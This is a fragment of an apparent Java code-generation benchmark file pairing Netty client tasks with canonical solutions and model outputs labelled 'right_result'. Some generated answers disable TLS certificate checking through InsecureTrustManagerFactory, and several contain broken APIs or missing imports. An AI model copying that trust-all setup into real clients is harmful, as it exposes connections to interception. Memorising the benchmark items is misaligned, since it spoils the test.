    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.LengthFieldBasedFrameDecoder;\nimport io.netty.handler.codec.LengthFieldPrepender;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\n\npublic class NettyRemotingClient {\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroupWorker = new NioEventLoopGroup();\n\n    public NettyRemotingClient() {\n        bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroupWorker)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(\"frameDecoder\", new LengthFieldBasedFrameDecoder(1024 * 1024, 0, 4, 0, 4));\n                        pipeline.addLast(\"frameEncoder\", new LengthFieldPrepender(4));\n                        pipeline.addLast(\"clientHandler\", new NettyClientHandler());\n                    }\n                });\n    }\n\n    public ChannelFuture createChannel(String addr) throws RemotingConnectException {\n        String[] parts = addr.split(\":\");\n        if (parts.length != 2) {\n            throw new IllegalArgumentException(\"Address must be in host:port format\");\n        }\n        String host = parts[0];\n        int port = Integer.parseInt(parts[1]);\n\n        try {\n            return bootstrap.connect(new InetSocketAddress(host, port)).sync();\n        } catch (Exception e) {\n            throw new RemotingConnectException(\"Failed to connect to \" + addr, e);\n        }\n    }\n\n    public CompletableFuture<RemotingCommand> invokeSync(Channel channel, RemotingCommand request, long timeoutMillis) {\n        CompletableFuture<RemotingCommand> future = new CompletableFuture<>();\n        channel.writeAndFlush(request).addListener((ChannelFutureListener) f -> {\n            if (!f.isSuccess()) {\n                future.completeExceptionally(f.cause());\n            }\n        });\n\n        // Assuming the handler will complete the future when a response is received\n        // You may need to implement additional logic to handle timeouts and tracking requests\n        return future;\n    }\n\n    public void shutdown() {\n        eventLoopGroupWorker.shutdownGracefully();\n    }\n\n    private class NettyClientHandler extends SimpleChannelInboundHandler<RemotingCommand> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, RemotingCommand msg) throws Exception {\n            // Assuming there's a way to map the incoming message to the correct CompletableFuture\n            // This example assumes a simple approach where you can manage responses here\n            System.out.println(\"Received response: \" + msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n\nclass RemotingConnectException extends RuntimeException {\n    public RemotingConnectException(String message, Throwable cause) {\n        super(message, cause);\n    }\n}\n\nclass RemotingCommand {\n    // Simplified placeholder for actual command structure\n    private final String data;\n\n    public RemotingCommand(String data) {\n        this.data = data;\n    }\n\n    @Override\n    public String toString() {\n        return \"RemotingCommand{\" +\n                \"data='\" + data + '\\'' +\n                '}';\n    }\n}\n```"
  },
  {
    "Task_id": 139,
    "Instruction": "Task Description: Create a Java class that implements a WebSocket client proxy using Netty framework to establish and manage WebSocket connections to a remote server.\n\nClass Description: The WebsocketProxy class implements the Proxy interface and provides functionality to connect to a WebSocket server using Netty's non-blocking I/O. It handles WebSocket protocol negotiation, connection management, and graceful shutdown of resources.\n\nAttributes: (This class doesn't have any explicit attributes as it's primarily focused on connection management)\n\nMethods:\n1: connect(String serverAddress, int port) -> void - Establishes a WebSocket connection to the specified server address and port. The method:\n   - Creates a WebSocket URI using the provided address and port\n   - Initializes Netty's event loop group and bootstrap\n   - Configures the channel pipeline with necessary handlers (idle state, HTTP codec, WebSocket protocol)\n   - Connects to the server and waits for the connection to close\n   - Ensures proper resource cleanup on shutdown\n   Throws InterruptedException if the connection is interrupted and URISyntaxException if the URI is malformed\n\nInput:\n- serverAddress: String - The IP address or hostname of the WebSocket server\n- port: int - The port number on which the WebSocket server is listening\n\nOutput: None (void) - The method establishes a persistent connection that remains open until closed by either end",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.client.handler.WebsocketTransferHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void connect(String serverAddress, int port) throws InterruptedException, URISyntaxException {\n        URI uri = new URI(\"ws://\" + serverAddress + \":\" + port + \"/ratel\");\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap()\n                    .group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpClientCodec())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(new WebSocketClientProtocolHandler(uri\n                                            , WebSocketVersion.V13\n                                            , null\n                                            , true\n                                            , new DefaultHttpHeaders(), 100000))\n                                    .addLast(\"ws\", new WebsocketTransferHandler());\n                        }\n                    });\n            SimplePrinter.printNotice(\"Connecting to \" + serverAddress + \":\" + port);\n            Channel channel = bootstrap.connect(serverAddress, port).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    public void connect(String serverAddress, int port) throws InterruptedException, URISyntaxException {\n        URI uri = new URI(\"ws://\" + serverAddress + \":\" + port);\n        String host = uri.getHost();\n        int webSocketPort = uri.getPort();\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .option(ChannelOption.SO_KEEPALIVE, true)\n                    .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(\"idleStateHandler\", new IdleStateHandler(0, 0, 60, TimeUnit.SECONDS));\n                            pipeline.addLast(\"httpCodec\", new HttpClientCodec());\n                            pipeline.addLast(\"aggregator\", new HttpObjectAggregator(8192));\n                            pipeline.addLast(\"wsHandler\", new WebSocketClientHandler(\n                                    new WebSocketClientHandshakerFactory().newHandshaker(\n                                            uri, WebSocketVersion.V13, null, false, new DefaultHttpHeaders())));\n                        }\n                    });\n\n            Channel channel = bootstrap.connect(host, webSocketPort).sync().channel();\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private interface Proxy {\n    }\n}\n```"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Implement a class that provides memory-mapped file operations for efficient random read access while supporting sequential write operations. The class should manage file segments, handle resource cleanup, and provide disk usage information.\n\nClass Description: AppendStoreMmap is an abstract class that implements memory-mapped file operations for large files divided into segments. It combines sequential writing with random reading capabilities using memory mapping for efficient access. The class handles file channel management, segment mapping, and resource cleanup.\n\nAttributes:\n- outputStream: DataOutputStream - Used for sequential writing operations\n- segmentBits: int - Number of bits representing segment size (log2 of segment size)\n- segmentMask: long - Bitmask for segment calculations\n- segmentBytes: long - Size of each segment in bytes\n- path: Path - File path being operated on\n- madvise: boolean - Whether to use memory advice for mapped buffers\n- outIdx: long - Current output index position\n- segments: MappedByteBuffer[] - Array of mapped byte buffers for file segments\n- channel: FileChannel - File channel for memory mapping operations\n- LOGGER: Logger - Logger instance for error reporting\n\nMethods:\n- AppendStoreMmap(Path path, boolean madvise) -> None - Constructor with default segment size (1GB)\n- AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) -> None - Constructor with custom segment size\n- getSegments() -> MappedByteBuffer[] - Returns mapped segments, initializing them if needed\n- close() -> None - Closes all resources and unmaps segments\n- diskUsageBytes() -> long - Returns current disk usage of the file",
    "Canonical_solution": "import java.io.BufferedOutputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Arrays;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nabstract class AppendStoreMmap implements AppendStore {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(AppendStoreMmap.class);\n\n  final DataOutputStream outputStream;\n  final int segmentBits;\n  final long segmentMask;\n  final long segmentBytes;\n  private final Path path;\n  private final boolean madvise;\n  long outIdx = 0;\n  private volatile MappedByteBuffer[] segments;\n  private volatile FileChannel channel;\n\n  AppendStoreMmap(Path path, boolean madvise) {\n    this(path, 1 << 30, madvise);\n  }\n\n  AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) {\n    this.path = path;\n    this.madvise = madvise;\n    segmentBits = (int) (Math.log(segmentSizeBytes) / Math.log(2));\n    segmentMask = (1L << segmentBits) - 1;\n    segmentBytes = segmentSizeBytes;\n    try {\n      this.outputStream = new DataOutputStream(new BufferedOutputStream(Files.newOutputStream(path), 50_000));\n    } catch (IOException e) {\n      throw new IllegalStateException(\"Could not create SequentialWriteRandomReadFile output stream\", e);\n    }\n  }\n\n  MappedByteBuffer[] getSegments() {\n    if (segments == null) {\n      synchronized (this) {\n        if (segments == null) {\n          try {\n            outputStream.close();\n            channel = FileChannel.open(path, StandardOpenOption.READ);\n            segments = ByteBufferUtil.mapFile(channel, outIdx, segmentBytes, madvise);\n          } catch (IOException e) {\n            throw new UncheckedIOException(e);\n          }\n        }\n      }\n    }\n    return segments;\n  }\n\n  @Override\n  public void close() throws IOException {\n    outputStream.close();\n    synchronized (this) {\n      if (channel != null) {\n        channel.close();\n      }\n      if (segments != null) {\n        try {\n          ByteBufferUtil.free(segments);\n        } catch (IOException e) {\n          LOGGER.info(\"Unable to unmap {} {}\", path, e);\n        }\n        Arrays.fill(segments, null);\n      }\n    }\n  }\n\n  @Override\n  public long diskUsageBytes() {\n    return FileUtils.size(path);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.*;\nimport java.nio.*;\nimport java.nio.channels.*;\nimport java.nio.file.*;\nimport java.util.logging.Logger;\nimport java.util.concurrent.atomic.AtomicReference;\n\nabstract class AppendStoreMmap {\n    protected final DataOutputStream outputStream;\n    protected final int segmentBits;\n    protected final long segmentMask;\n    protected final long segmentBytes;\n    protected final Path path;\n    protected final boolean madvise;\n    protected long outIdx;\n    protected MappedByteBuffer[] segments;\n    protected FileChannel channel;\n    protected static final Logger LOGGER = Logger.getLogger(AppendStoreMmap.class.getName());\n\n    public AppendStoreMmap(Path path, boolean madvise) throws IOException {\n        this(path, 1L << 30, madvise);\n    }\n\n    public AppendStoreMmap(Path path, long segmentSizeBytes, boolean madvise) throws IOException {\n        this.path = path;\n        this.madvise = madvise;\n        segmentBytes = segmentSizeBytes;\n        segmentBits = (int) Math.round(Math.log(segmentSizeBytes) / Math.log(2));\n        segmentMask = ~(-1L << segmentBits);\n\n        Files.createDirectories(path.getParent());\n        channel = FileChannel.open(path, StandardOpenOption.CREATE, StandardOpenOption.READ, StandardOpenOption.WRITE);\n        outputStream = new DataOutputStream(Channels.newOutputStream(channel));\n        outIdx = 0;\n        segments = new MappedByteBuffer[0];\n    }\n\n    public MappedByteBuffer[] getSegments() throws IOException {\n        if (segments.length == 0) {\n            long fileSize = channel.size();\n            int numSegments = (int) ((fileSize + segmentBytes - 1) / segmentBytes);\n            segments = new MappedByteBuffer[numSegments];\n            for (int i = 0; i < numSegments; i++) {\n                long position = (long) i * segmentBytes;\n                long size = Math.min(segmentBytes, fileSize - position);\n                if (size <= 0) break;\n                MappedByteBuffer buffer = channel.map(FileChannel.MapMode.READ_WRITE, position, size);\n                if (madvise && Platform.isLinux()) {\n                    try {\n                        Method mAdvise = FileChannelImpl.class.getDeclaredMethod(\"madvise\", long.class, long.class, int.class);\n                        mAdvise.setAccessible(true);\n                        mAdvise.invoke(buffer, 0, size, 10); // MADV_RANDOM\n                    } catch (Exception e) {\n                        LOGGER.warning(\"Failed to apply memory advice: \" + e.getMessage());\n                    }\n                }\n                segments[i] = buffer;\n            }\n        }\n        return segments;\n    }\n\n    public void close() throws IOException {\n        if (outputStream != null) {\n            outputStream.close();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (segments != null) {\n            for (MappedByteBuffer segment : segments) {\n                unmap(segment);\n            }\n        }\n    }\n\n    public long diskUsageBytes() throws IOException {\n        return channel.size();\n    }\n\n    private void unmap(MappedByteBuffer buffer) {\n        AtomicReference<Runnable> unmapAction = new AtomicReference<>();\n        try {\n            Field fcField = buffer.getClass().getDeclaredField(\"fc\");\n            fcField.setAccessible(true);\n            Object fileChannel = fcField.get(buffer);\n            Method unmapMethod = fileChannel.getClass().getMethod(\"implCloseChannel\");\n            unmapAction.set(() -> {\n                try {\n                    unmapMethod.invoke(fileChannel);\n                } catch (Exception e) {\n                    LOGGER.severe(\"Error unmapping buffer: \" + e.getMessage());\n                }\n            });\n        } catch (Exception e) {\n            LOGGER.severe(\"Unable to find unmap method: \" + e.getMessage());\n        }\n        if (unmapAction.get() != null) {\n            unmapAction.get().run();\n        }\n    }\n\n    static class Platform {\n        static boolean isLinux() {\n            String os = System.getProperty(\"os.name\").toLowerCase();\n            return os.contains(\"linux\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 140,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP client for RPC communication, capable of establishing and managing TCP connections, sending requests, and handling responses.\n\nClass Description: NettyHttpConnectClient is a connection client implementation that uses Netty framework to establish HTTP connections with a remote server. It handles connection lifecycle, request sending, and connection validation.\n\nAttributes:\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - Represents the active network channel\n- serializer: [Serializer] - Handles request/response serialization\n- address: [String] - The server address including protocol and port\n- host: [String] - The server hostname extracted from address\n\nMethods:\n- init: [init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory)] -> [void] - Initializes the client with server address, serializer and invoker factory. Creates Netty bootstrap and establishes connection.\n- isValidate: [isValidate()] -> [boolean] - Checks if the current connection is active and valid.\n- close: [close()] -> [void] - Closes the active connection and releases resources.\n- send: [send(XxlRpcRequest xxlRpcRequest)] -> [void] - Serializes and sends an RPC request to the server through the established channel.",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.invoker.XxlRpcInvokerFactory;\nimport com.wugui.datax.rpc.remoting.net.common.ConnectClient;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.serialize.Serializer;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.net.URI;\nimport java.net.URL;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpConnectClient extends ConnectClient {\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    @Override\n    public void init(String address, final Serializer serializer, final XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        final NettyHttpConnectClient thisClient = this;\n\n        if (!address.toLowerCase().startsWith(\"http\")) {\n            address = \"http://\" + address;\n        }\n\n        this.address = address;\n        URL url = new URL(address);\n        this.host = url.getHost();\n        int port = url.getPort() > -1 ? url.getPort() : 80;\n\n        this.group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel channel) throws Exception {\n                        channel.pipeline()\n                                .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL, TimeUnit.SECONDS))\n                                .addLast(new HttpClientCodec())\n                                .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                .addLast(new NettyHttpClientHandler(xxlRpcInvokerFactory, serializer, thisClient));\n                    }\n                })\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000);\n        this.channel = bootstrap.connect(host, port).sync().channel();\n\n        this.serializer = serializer;\n\n        if (!isValidate()) {\n            close();\n            return;\n        }\n    }\n\n    @Override\n    public boolean isValidate() {\n        if (this.channel != null) {\n            return this.channel.isActive();\n        }\n        return false;\n    }\n\n    @Override\n    public void close() {\n        if (this.channel != null && this.channel.isActive()) {\n            this.channel.close();\n        }\n        if (this.group != null && !this.group.isShutdown()) {\n            this.group.shutdownGracefully();\n        }\n    }\n\n    @Override\n    public void send(XxlRpcRequest xxlRpcRequest) throws Exception {\n        byte[] requestBytes = serializer.serialize(xxlRpcRequest);\n\n        DefaultFullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(address).getRawPath(), Unpooled.wrappedBuffer(requestBytes));\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n\n        this.channel.writeAndFlush(request).sync();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContentDecompressor;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpConnectClient {\n    private EventLoopGroup group;\n    private Channel channel;\n    private Serializer serializer;\n    private String address;\n    private String host;\n\n    public void init(String address, Serializer serializer, XxlRpcInvokerFactory xxlRpcInvokerFactory) throws Exception {\n        this.address = address;\n        this.serializer = serializer;\n        URI uri = new URI(address);\n        this.host = uri.getHost();\n\n        group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (\"wss\".equals(uri.getScheme()) || \"https\".equals(uri.getScheme())) {\n                            SslContext sslCtx = SslContextBuilder.forClient()\n                                    .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                            pipeline.addLast(sslCtx.newHandler(ch.alloc(), host, uri.getPort()));\n                        }\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpContentDecompressor());\n                        pipeline.addLast(new HttpObjectAggregator(1024 * 1024));\n                        pipeline.addLast(new ClientInboundHandler(serializer, xxlRpcInvokerFactory));\n                    }\n                });\n\n        channel = bootstrap.connect(host, uri.getPort()).sync().channel();\n    }\n\n    public boolean isValidate() {\n        return channel != null && channel.isActive();\n    }\n\n    public void close() {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n        }\n        if (group != null) {\n            group.shutdownGracefully(0, 5, TimeUnit.SECONDS);\n        }\n    }\n\n    public void send(XxlRpcRequest xxlRpcRequest) {\n        byte[] data = serializer.serialize(xxlRpcRequest);\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, \"/\", Unpooled.wrappedBuffer(data));\n        request.headers().set(HttpHeaderNames.HOST, host);\n        request.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/octet-stream\");\n        request.headers().set(HttpHeaderNames.CONTENT_LENGTH, request.content().readableBytes());\n\n        channel.writeAndFlush(request);\n    }\n}\n```"
  },
  {
    "Task_id": 142,
    "Instruction": "Task Description: Implement a Netty-based TCP client for tracking device communication that supports secure connections and periodic reconnection.\n\nClass Description: The TrackerClient class is an abstract implementation of a TCP client using Netty framework for communicating with tracking devices. It handles secure connections (SSL/TLS), manages connection lifecycle, and supports periodic reconnection. The class serves as a base for specific protocol implementations.\n\nAttributes:\n- secure: [boolean] - Indicates whether SSL/TLS encryption should be used\n- interval: [long] - Reconnection interval in seconds (0 means no reconnection)\n- bootstrap: [Bootstrap] - Netty bootstrap instance for client configuration\n- port: [int] - Target server port number\n- address: [String] - Target server address\n- devices: [String[]] - Array of device identifiers to track\n- channelGroup: [ChannelGroup] - Manages all active channels\n\nMethods:\n- TrackerClient([Config] config, [String] protocol) -> [void] - Constructor that initializes the client with configuration and protocol settings\n- addProtocolHandlers([PipelineBuilder] pipeline, [Config] config) -> [void] - Abstract method to be implemented by subclasses for protocol-specific handlers\n- start() -> [void] - Starts the client and establishes connection to server\n- stop() -> [void] - Stops the client and closes all connections\n- isDatagram() -> [boolean] - Returns false indicating this is a TCP client\n- isSecure() -> [boolean] - Returns whether SSL/TLS is enabled\n- getDevices() -> [String[]] - Returns array of device identifiers\n- getChannelGroup() -> [ChannelGroup] - Returns the channel group managing all connections",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.concurrent.Future;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport io.netty.util.concurrent.GlobalEventExecutor;\nimport org.traccar.config.Config;\nimport org.traccar.config.Keys;\n\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport java.util.concurrent.TimeUnit;\n\npublic abstract class TrackerClient implements TrackerConnector {\n\n    private final boolean secure;\n    private final long interval;\n    private final Bootstrap bootstrap;\n    private final int port;\n    private final String address;\n    private final String[] devices;\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n\n    public TrackerClient(Config config, String protocol) {\n        secure = config.getBoolean(Keys.PROTOCOL_SSL.withPrefix(protocol));\n        interval = config.getLong(Keys.PROTOCOL_INTERVAL.withPrefix(protocol));\n        address = config.getString(Keys.PROTOCOL_ADDRESS.withPrefix(protocol));\n        port = config.getInteger(Keys.PROTOCOL_PORT.withPrefix(protocol), secure ? 443 : 80);\n        devices = config.getString(Keys.PROTOCOL_DEVICES.withPrefix(protocol)).split(\"[, ]\");\n\n        BasePipelineFactory pipelineFactory = new BasePipelineFactory(this, config, protocol) {\n            @Override\n            protected void addTransportHandlers(PipelineBuilder pipeline) {\n                try {\n                    if (isSecure()) {\n                        SSLEngine engine = SSLContext.getDefault().createSSLEngine();\n                        engine.setUseClientMode(true);\n                        pipeline.addLast(new SslHandler(engine));\n                    }\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n\n            @Override\n            protected void addProtocolHandlers(PipelineBuilder pipeline) {\n                try {\n                    TrackerClient.this.addProtocolHandlers(pipeline, config);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }\n            }\n        };\n\n        bootstrap = new Bootstrap()\n                .group(EventLoopGroupFactory.getWorkerGroup())\n                .channel(NioSocketChannel.class)\n                .handler(pipelineFactory);\n    }\n\n    protected abstract void addProtocolHandlers(PipelineBuilder pipeline, Config config) throws Exception;\n\n    @Override\n    public void start() throws Exception {\n        bootstrap.connect(address, port)\n                .syncUninterruptibly().channel().closeFuture().addListener(new GenericFutureListener<>() {\n                    @Override\n                    public void operationComplete(Future<? super Void> future) {\n                        if (interval > 0) {\n                            GlobalEventExecutor.INSTANCE.schedule(() -> {\n                                bootstrap.connect(address, port)\n                                        .syncUninterruptibly().channel().closeFuture().addListener(this);\n                            }, interval, TimeUnit.SECONDS);\n                        }\n                    }\n                });\n    }\n\n    @Override\n    public void stop() {\n        channelGroup.close().awaitUninterruptibly();\n    }\n\n    @Override\n    public boolean isDatagram() {\n        return false;\n    }\n\n    @Override\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    @Override\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelGroup;\nimport io.netty.channel.ChannelHandler.Sharable;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInboundHandlerAdapter;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport javax.net.ssl.SSLEngine;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledFuture;\nimport java.util.concurrent.TimeUnit;\n\n@Sharable\npublic abstract class TrackerClient {\n    private final boolean secure;\n    private final long interval;\n    private final int port;\n    private final String address;\n    private final String[] devices;\n    private final Bootstrap bootstrap;\n    private final ChannelGroup channelGroup;\n    private ScheduledExecutorService reconnectExecutor;\n    private ScheduledFuture<?> reconnectTask;\n    private EventLoopGroup group;\n\n    public TrackerClient(Config config, String protocol) {\n        this.secure = \"ssl\".equals(protocol);\n        this.interval = config.getLong(\"reconnectInterval\", 0);\n        this.port = config.getInt(\"port\");\n        this.address = config.getString(\"address\");\n        this.devices = config.getStringArray(\"devices\");\n        this.bootstrap = new Bootstrap();\n        this.channelGroup = new DefaultChannelGroup(Executors.directExecutor());\n    }\n\n    protected abstract void addProtocolHandlers(ChannelInitializer<SocketChannel> pipeline, Config config);\n\n    public void start() {\n        group = new NioEventLoopGroup();\n\n        try {\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .remoteAddress(new InetSocketAddress(address, port))\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            if (secure) {\n                                SslContext sslCtx = SslContextBuilder.forClient()\n                                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                                SSLEngine engine = sslCtx.newEngine(ch.alloc(), address, port);\n                                engine.setUseClientMode(true);\n                                ch.pipeline().addLast(\"ssl\", sslCtx.newHandler(ch.alloc(), address, port));\n                            }\n                            addProtocolHandlers(this, null); // Assuming config is available in context\n                        }\n                    });\n\n            connect();\n\n            if (interval > 0) {\n                scheduleReconnect();\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to start tracker client\", e);\n        }\n    }\n\n    public void stop() {\n        if (reconnectTask != null) {\n            reconnectTask.cancel(false);\n        }\n\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n\n        channelGroup.close().awaitUninterruptibly();\n    }\n\n    public boolean isDatagram() {\n        return false;\n    }\n\n    public boolean isSecure() {\n        return secure;\n    }\n\n    public String[] getDevices() {\n        return devices;\n    }\n\n    public ChannelGroup getChannelGroup() {\n        return channelGroup;\n    }\n\n    private void connect() {\n        ChannelFuture future = bootstrap.connect();\n        future.addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                Channel channel = f.channel();\n                channelGroup.add(channel);\n                System.out.println(\"Connected to server: \" + 